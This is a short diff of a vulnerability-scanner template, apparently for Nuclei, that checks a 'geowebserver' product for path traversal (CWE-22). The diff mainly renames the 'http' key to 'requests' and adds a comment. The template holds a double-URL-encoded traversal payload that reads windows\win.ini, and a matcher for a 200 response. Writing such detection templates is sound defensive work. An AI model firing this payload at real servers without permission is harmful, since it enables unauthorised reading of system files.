@@ -12,10 +12,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: packetstorm,geowebserver,lfi
-  metadata:
-    max-request: 2
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini"
@@ -35,3 +33,5 @@ http:
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/07/27
